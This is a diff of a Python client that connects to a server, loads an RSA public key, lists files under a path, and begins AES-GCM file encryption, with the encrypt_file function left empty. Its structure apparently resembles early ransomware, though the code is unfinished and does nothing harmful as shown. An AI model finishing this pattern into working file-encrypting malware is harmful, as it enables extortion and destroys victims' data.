@@ -2,6 +2,11 @@ import socket
 import pathlib
 from cryptography.hazmat.primitives import serialization
 from client.file import File
+#import secrets
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import os
+
+
 
 
 def connect_to_server(public_ip, port):
@@ -21,6 +26,10 @@ def get_all_files(path):
     return all_files
 
 
+def encrypt_file(nonce, file, associated_data=None):
+
+
+
 def main():
     print("now starting main....")
     server_public_ip = "SERVER_PUBLIC_IP"
@@ -28,9 +37,13 @@ def main():
 
     server_sock = connect_to_server(server_public_ip, port)
     public_key_bytes = server_sock.recv(4096)
-
     rsa_public_key = serialization.load_pem_public_key(public_key_bytes)
-    print("Public key received and loaded successfully!")
+
+    AES_key_256 = AESGCM.generate_key(bit_length=256)
+    nonce = os.urandom(12)
+
+
+
 
 
 if __name__ == "__main__":
